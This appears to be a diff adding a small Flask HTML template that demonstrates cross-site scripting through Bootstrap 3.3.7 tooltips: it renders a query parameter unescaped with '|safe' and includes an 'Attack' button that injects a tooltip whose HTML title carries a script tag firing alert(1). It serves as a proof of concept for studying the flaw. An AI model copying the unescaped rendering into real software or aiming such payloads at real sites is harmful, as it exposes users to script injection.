@@ -1,0 +1,18 @@
+<html>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.css"></link>
+    <script src="{{ url_for('static', filename='jquery.min.js') }}"></script>
+    <script src="{{ url_for('static', filename='bootstrap.js') }}"></script>
+    <p>Bootstrap</p>    
+    {{inj|safe}}
+    <script>
+      $("[data-toggle=tooltip]").tooltip();
+    </script>
+    <button onclick="attack()">Attack</button>
+    <script>
+        let url = window.location.href;
+        const attack = () => {
+          window.location.replace(url+"?inj=<div data-toggle=tooltip data-html=true title='<script>alert(1)<\/script>'>success</div>");
+        }
+    </script>
+</html>
+
